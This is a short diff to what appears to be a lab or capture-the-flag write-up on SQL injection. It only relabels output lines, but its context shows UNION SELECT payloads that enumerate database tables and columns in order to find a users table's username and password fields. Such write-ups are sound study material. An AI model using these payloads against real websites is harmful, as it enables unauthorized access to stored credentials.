@@ -31,13 +31,13 @@ Step - 5
 --------
 ' UNION SELECT 'a',table_name FROM information_schema.tables--
 --------------------------------------------------------------
-Table: users_losije
+Table Name: users_losije
 
 Step - 6
 --------
 ' UNION SELECT 'a',column_name FROM information_schema.columns WHERE table_name='users_losije'--
 ------------------------------------------------------------------------------------------------
-Column: username_nlazuv and password_xcildc
+Column Name: username_nlazuv and password_xcildc
 
 Step - 7
 --------
